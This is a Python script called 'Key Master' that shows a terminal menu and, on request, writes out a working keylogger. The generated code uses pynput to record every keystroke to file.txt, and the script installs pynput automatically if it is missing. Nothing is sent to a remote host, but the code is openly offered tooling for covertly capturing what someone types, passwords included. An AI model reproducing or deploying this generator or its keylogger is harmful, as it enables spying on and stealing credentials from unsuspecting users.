#!/usr/bin/python3
# This code write by Mr.nope
# version 1.3.0
# Github: https://github.com/mrprogrammer2938
# Instagram: https://instagram.com/programmer2938
import os
import time
import sys
import platform
try:
    from pynput.keyboard import Listener
except ImportError:
    os.system("pip3 install pynput")
class color:
     green = '\033[92m'
     red = '\033[91m'
     blue = '\033[96m'
     End = '\033[0m'
     line = '\033[4m'
     org = '\033[33m'
     prl = '\033[98m'
opt = "\nKey-Master/> "
system = platform.uname()[0]
def title():
    os.system("printf '\033]2;Key Master\a'")
def title2():
    os.system("title Key Master")
def cls():
    os.system("clear")
def cls2():
    os.system("cls")
def menu2():
    title2()
    cls2()
    banner()
    list2()
def menu():
    title()
    cls()
    banner()
    list()
def banner():
    print(color.blue + """
                                    _            
  /\ /\___ _   _    /\/\   __ _ ___| |_ ___ _ __ 
 / //_/ _ \ | | |  /    \ / _` / __| __/ _ \ '__|
/ __ \  __/ |_| | / /\/\ \ (_| \__ \ ||  __/ |   """ + color.red + " Version: " + color.green + "1.3.0" + color.blue + """
\/  \/\___|\__, | \/    \/\__,_|___/\__\___|_|   
           |___/                                 """ + color.org + """
  This code write by """ + color.line + "Mr.nope" + color.End)
def list2():
    print("\n{1}-Start")
    print("{2}-Developer")
    print("{3}-Exit")
    choose = input(opt)
    if choose == '1':
      time.sleep(1)
      file = input("\nEnter file name: ")
      time.sleep(1)
      print("\nCreating...")
      time.sleep(2)
      a = open(file,"w")
      a.write("""
# This code write by Mr.nope

from pynput.keyboard import Listener

def start(key):
    a = open("file.txt","a")
    a.write(str(key))
    a.close()
try:
   print("Hi, Enter:")
   logger = Listener(on_press = start)
   logger.start()
   while True:
        pass
except KeyboardInterrupt:
    print("Exiting...")""")
      a.close()
      print("\nFinish...!")
      sys.exit()
    elif choose == '2':
        cls()
        os.system("figlet -f slant Key Master|lolcat")
        print(color.red + "\nThis Programm write by " + color.green + "Mr.nope" + color.End)
        print(color.org + "\nVersion: " + color.blue + "1.3.0" + color.End)
        print(color.prl + "\nGithub: " + color.line + "https://github.com/mrprogrammer2938" + color.End)
        time.sleep(1)
        try1()
    elif choose == '3':
        cls2()
        print(color.green + "Exiting..." + color.End)
        sys.exit()
    elif choose == '':
        menu2()
    elif choose == ' ':
        menu2()
    else:
         cls()
         print(choose + color.red + " Not Found!" + color.End)
         try2()
def list():
    print("\n{1}-Start")
    print("{2}-Developer")
    print("{3}-Exit")
    choose = input(opt)
    if choose == '1':
      time.sleep(1)
      file = input("Enter file name: ")
      time.sleep(1)
      print("\nCreating...")
      time.sleep(2)
      a = open(file,"w")
      a.write("""
# This code write by Mr.nope

from pynput.keyboard import Listener

def start(key):
    a = open("file.txt","a")
    a.write(str(key))
    a.close()
try:
   print("Hi, Enter:")
   logger = Listener(on_press = start)
   logger.start()
   while True:
        pass
except KeyboardInterrupt:
    print("Exiting...")""")
      a.close()
      print("\nFinish...!")
      sys.exit()
    elif choose == '2':
        cls()
        os.system("figlet -f slant Key Master|lolcat")
        print(color.red + "\nThis Programm write by " + color.green + "Mr.nope" + color.End)
        print(color.org + "\nVersion: " + color.blue + "1.3.0" + color.End)
        print(color.prl + "\nGithub: " + color.line + "https://github.com/mrprogrammer2938" + color.End)
        time.sleep(1)
        try1()
    elif choose == '3':
        cls()
        print(color.green + "Exiting..." + color.End)
        sys.exit()
    elif choose == '':
        menu()
    elif choose == ' ':
        menu()
    else:
        cls()
        print(choose + color.red + " Not Found!" + color.End)
        try1()
def try1():
    try_to_backmenu = input("\npress Enter...")
    if try_to_backmenu == '':
      menu()
    else:
        menu() 
def try2():
    try_to_backmenu = input("\npress Enter...")
    if try_to_backmenu == '':
      menu2()
    else:
         menu2()
if __name__ == '__main__':
  try: 
     if system == 'Linux':
       menu()
     elif system == 'Mac':
         menu()
     elif system == 'Windows':
         menu2()
     else:
          print("\nPlease, Run This Programm on Windows,Linux or MacPS\n")
          sys.exit()
  except KeyboardInterrupt:
      print("\nCtrl + C")
      print("\nExiting...")
      sys.exit()
    
